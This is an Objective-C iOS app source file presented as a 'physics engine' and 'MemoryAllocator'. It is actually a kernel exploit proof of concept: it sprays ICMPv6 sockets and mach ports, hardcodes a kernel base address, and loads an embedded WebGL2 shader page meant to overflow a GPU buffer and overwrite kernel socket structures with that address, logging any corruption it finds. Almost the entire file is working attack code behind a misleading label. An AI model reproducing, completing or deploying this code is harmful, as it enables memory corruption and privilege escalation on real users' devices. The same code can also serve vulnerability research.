/* physics engine v4 */

#import <UIKit/UIKit.h>
#import <WebKit/WebKit.h>
#include <mach/mach.h>
#include <netinet/icmp6.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <asl.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <pthread.h>
#include <CoreGraphics/CoreGraphics.h>

#define NUM_PORTS        20000
#define NUM_SOCKETS      200
#define COMMPAGE_TARGET  0x0000000FFFFFC330ULL
/* S159 kernel slide 0x46924000, kernel_base 0xfffffe004d928000 */
#define KBASE_LO         0x4d928000u
#define KBASE_HI         0xfffffe00u
#define IKOT_TIMER_BITS  2147483675u  /* 0x8000001B */
#define PROBE_INTERVAL_S 1

static mach_port_t  g_ports[NUM_PORTS];
static int          g_port_count  = 0;
static int          g_socks[NUM_SOCKETS];
static int          g_sock_count  = 0;
static _Atomic int  g_found       = 0;
static _Atomic int  g_sprayed     = 0;
static _Atomic int  g_fired       = 0;
static _Atomic int  g_tick        = 0;
static FILE        *g_logfile     = NULL;
static WKWebView   *g_webView     = NULL;
/* baseline filter: 0xFF×32 set during spray */
static unsigned char g_baseline[NUM_SOCKETS][32];
static int           g_baseline_ok[NUM_SOCKETS];

static void ev(const char *fmt, ...) {
    char buf[512]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    asl_log(NULL, NULL, ASL_LEVEL_NOTICE, "%{public}s", buf);
    NSLog(@"[v20] %{public}s", buf);
    if (g_logfile) { fprintf(g_logfile, "%s\n", buf); fflush(g_logfile); }
}

static void spray(void) {
    unsigned char ff[32]; memset(ff, 0xFF, 32);
    for (int i = 0; i < NUM_SOCKETS; i++) {
        int fd = socket(30, 2, 58); /* AF_INET6, SOCK_RAW, IPPROTO_ICMPV6 */
        if (fd < 0) break;
        setsockopt(fd, 58, 18, ff, 32); /* IPPROTO_ICMPV6, ICMP6_FILTER */
        g_socks[g_sock_count++] = fd;
        g_baseline_ok[i] = 0;
    }
    mach_port_t task = mach_task_self();
    for (int i = 0; i < NUM_PORTS; i++) {
        mach_port_t p = MACH_PORT_NULL;
        if (mach_port_allocate(task, MACH_PORT_RIGHT_RECEIVE, &p) != KERN_SUCCESS) break;
        if (mach_port_insert_right(task, p, p, MACH_MSG_TYPE_MAKE_SEND) != KERN_SUCCESS) {
            mach_port_deallocate(task, p); break;
        }
        g_ports[g_port_count++] = p;
    }
    g_sprayed = 1;
    ev("SPRAY socks=%d ports=%d", g_sock_count, g_port_count);
}

static void take_baseline(void) {
    int ok = 0, fail = 0;
    for (int i = 0; i < g_sock_count; i++) {
        socklen_t fl = 32;
        if (getsockopt(g_socks[i], 58, 18, g_baseline[i], &fl) == 0) {
            g_baseline_ok[i] = 1; ok++;
        } else {
            g_baseline_ok[i] = 0; fail++;
            ev("BASELINE_ERR sock=%d errno=%d", i, errno);
        }
    }
    ev("BASELINE done ok=%d fail=%d", ok, fail);
}

static void scan_sockets_after_fire(void) {
    int corrupt = 0, err_fault = 0, err_other = 0, unchanged = 0;
    for (int i = 0; i < g_sock_count; i++) {
        unsigned char out[32]; socklen_t fl = 32;
        if (getsockopt(g_socks[i], 58, 18, out, &fl) < 0) {
            int e = errno;
            if (e == EFAULT || e == ENOMEM || e == ENXIO) {
                err_fault++;
                ev("SOCK_ERR_FAULT sock=%d errno=%d -> in6p_icmp6filt CORRUPTED", i, e);
            } else {
                err_other++;
                ev("SOCK_ERR_OTHER sock=%d errno=%d", i, e);
            }
            continue;
        }
        /* Check if returned data differs from baseline */
        int changed = 0;
        for (int j = 0; j < 32; j++) {
            if (out[j] != 0xFF) {
                changed = 1;
                ev("SOCK_CORRUPT sock=%d byte[%d]=0x%02X", i, j, out[j]);
                corrupt++;
                break;
            }
        }
        if (!changed) unchanged++;
    }
    ev("SCAN_RESULT corrupt=%d efault=%d err_other=%d unchanged=%d",
       corrupt, err_fault, err_other, unchanged);
    if (corrupt > 0 || err_fault > 0)
        ev("ICMP_CORRUPTION_CONFIRMED icm6pcb_zone_is_GPU_ADJACENT");
    else
        ev("ICMP_NO_CORRUPTION DART_blocking_or_zone_not_adjacent");
}

static void scan_ports(void) {
    for (int i = 0; i < g_port_count; i++) {
        if (g_found) break;
        natural_t kotype = 0; mach_vm_address_t kobject = 0;
        if (mach_port_kobject(mach_task_self(), g_ports[i], &kotype, &kobject) != KERN_SUCCESS) continue;
        if (kotype == (natural_t)0xFFFFFFFF && kobject == 0) continue;
        if (kobject == COMMPAGE_TARGET) {
            g_found = 1;
            ev("PORT_MATCH port=%d kotype=%u val=0x%016llx", i, kotype, (unsigned long long)kobject);
        } else if (kobject != 0) {
            ev("PORT_CHANGED port=%d kotype=%u val=0x%016llx", i, kotype, (unsigned long long)kobject);
        }
    }
}

static void *probe_loop(void *unused) {
    (void)unused;
    /* Wait for spray */
    while (!g_sprayed) { struct timespec ts = {0, 50000000}; nanosleep(&ts, NULL); }

    /* Take baseline before any shader fire */
    take_baseline();

    int tick = 0;
    while (1) {
        struct timespec ts = {PROBE_INTERVAL_S, 0}; nanosleep(&ts, NULL);
        tick++; g_tick = tick;

        scan_ports();

        /* After fire: scan sockets once at +3s, +10s */
        if ((int)g_fired) {
            static int scan_done = 0;
            if (!scan_done) {
                scan_sockets_after_fire();
                scan_done = 1;
            }
        }

        ev("ALIVE tick=%d found=%d fired=%d ports=%d", tick, (int)g_found, (int)g_fired, g_port_count);
    }
    return NULL;
}

/* AGX shader — writes kernel_base to every 8B slot in icm6pcb structs.
 * kernel_base = 0xfffffe004d928000 is a valid mapped kernel address.
 * uvec4(KB_LO, KB_HI, KB_LO, KB_HI): each 16B uvec4 places kernel_base
 * at both 8B-aligned positions within it.
 * If in6p_icmp6filt is overwritten to kernel_base, getsockopt reads 32B
 * from the kernel MachO header -> non-0xFF bytes -> SOCK_CORRUPT logged. */
static NSString *const kAGXShaderHTML =
    @"<!DOCTYPE html><html><body style='background:#000'>"
     "<canvas id='c' width='16' height='16'></canvas>"
     "<script>"
     "(function(){"
     "var KB_LO=1301512192,KB_HI=4294966784;"    /* 0x4d928000, 0xfffffe00 */
     "var gl=document.getElementById('c').getContext('webgl2');"
     "if(!gl){window._v20='NO_WEBGL2';return;}"
     "var a='';"
     "for(var i=0;i<42;i++)"
     "  a+='v['+i+']=uvec4('+KB_LO+'u,'+KB_HI+'u,'+KB_LO+'u,'+KB_HI+'u);';"
     "var vs='#version 300 es\\nflat out uvec4 v[42];\\nvoid main(){\\n'"
     "       +a+'gl_Position=vec4(0,0,0,1);gl_PointSize=1.0;}\\n';"
     "var fs='#version 300 es\\nflat in uvec4 v[42];\\nout vec4 o;\\n"
              "void main(){o=vec4(float(v[0].x)*1e-15,0,0,1);}';"
     "function mk(t,s){"
     "  var sh=gl.createShader(t);"
     "  gl.shaderSource(sh,s);gl.compileShader(sh);return sh;}"
     "var p=gl.createProgram();"
     "gl.attachShader(p,mk(gl.VERTEX_SHADER,vs));"
     "gl.attachShader(p,mk(gl.FRAGMENT_SHADER,fs));"
     "gl.linkProgram(p);"
     "if(!gl.getProgramParameter(p,gl.LINK_STATUS)){"
     "  window._v20='LINK_ERR';return;}"
     "gl.useProgram(p);"
     "var fb=gl.createFramebuffer(),tx=gl.createTexture();"
     "gl.bindTexture(gl.TEXTURE_2D,tx);"
     "gl.texStorage2D(gl.TEXTURE_2D,1,gl.RGBA8,16,16);"
     "gl.bindFramebuffer(gl.FRAMEBUFFER,fb);"
     "gl.framebufferTexture2D(gl.FRAMEBUFFER,gl.COLOR_ATTACHMENT0,gl.TEXTURE_2D,tx,0);"
     "gl.viewport(0,0,16,16);"
     /* warmup: 200 draws at instance_count=1 to seed VOB pool */
     "var wc=0;"
     "function wu(){"
     "  if(wc<200){try{gl.drawArraysInstanced(gl.POINTS,0,256,1);}catch(e){}gl.flush();wc++;setTimeout(wu,5);}"
     "  else{window._v20='warmed';fire();}"
     "}"
     /* overflow fire: both patterns to maximize VOB overflow coverage */
     "function fire(){"
     "  var n=0;"
     "  function r(){"
     "    if(n>=10){window._v20='done_'+n;return;}"
     "    try{gl.drawArraysInstanced(gl.POINTS,0,256,16777217);}catch(e){}"
     "    try{gl.drawArraysInstanced(gl.POINTS,0,1024,4194305);}catch(e){}"
     "    gl.flush();n++;setTimeout(r,100);"
     "  }"
     "  r();"
     "}"
     "window._v20='warming';wu();"
     "})();"
     "</script></body></html>";

@interface AppDelegate : UIResponder <UIApplicationDelegate, WKNavigationDelegate>
@property (strong) UIWindow  *window;
@property (strong) WKWebView *shaderView;
@property (strong) NSTimer   *scanTimer;
@end

@implementation AppDelegate

- (BOOL)application:(UIApplication *)app
    didFinishLaunchingWithOptions:(NSDictionary *)opts {

    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *log = [[paths firstObject] stringByAppendingPathComponent:@"scan_log.txt"];
    g_logfile = fopen([log UTF8String], "w");
    [UIApplication sharedApplication].idleTimerDisabled = YES;

    self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor blackColor];
    UILabel *lbl = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 340, 60)];
    lbl.text = @"MemoryAllocator v4";
    lbl.textColor = [UIColor greenColor];
    lbl.font = [UIFont fontWithName:@"Menlo" size:14];
    [vc.view addSubview:lbl];

    WKWebViewConfiguration *cfg = [WKWebViewConfiguration new];
    cfg.allowsInlineMediaPlayback = YES;
    self.shaderView = [[WKWebView alloc] initWithFrame:CGRectMake(0, 200, 1, 1) configuration:cfg];
    self.shaderView.navigationDelegate = self;
    [vc.view addSubview:self.shaderView];
    g_webView = self.shaderView;

    self.window.rootViewController = vc;
    [self.window makeKeyAndVisible];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        spray();
        pthread_t th;
        pthread_create(&th, NULL, probe_loop, NULL);
        pthread_detach(th);
        ev("LAUNCH v20 socks=%d ports=%d", g_sock_count, g_port_count);

        /* Fire shader after 15s (let spray settle and baseline complete) */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 15LL * NSEC_PER_SEC),
                       dispatch_get_main_queue(), ^{
            ev("SHADER_FIRE begin webgl2 overflow from embedded WKWebView");
            [self.shaderView loadHTMLString:kAGXShaderHTML baseURL:nil];
        });

        /* Scan sockets 20s after app start (5s after shader should be done) */
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 20LL * NSEC_PER_SEC),
                       dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            g_fired = 1;
        });
    });

    self.scanTimer = [NSTimer scheduledTimerWithTimeInterval:1.0
                              target:self selector:@selector(reportTick:)
                              userInfo:nil repeats:YES];
    return YES;
}

- (void)reportTick:(NSTimer *)t {
    /* Check if shader HTML is done (window._v20 not 'warming') */
    [self.shaderView evaluateJavaScript:@"window._v20||'null'"
                      completionHandler:^(id res, NSError *err) {
        if (res) ev("SHADER_STATE %@", res);
    }];
}

- (void)webView:(WKWebView *)wv didFinishNavigation:(WKNavigation *)nav {
    ev("WEBVIEW_LOADED shader page ready");
}

@end

int main(int argc, char *argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
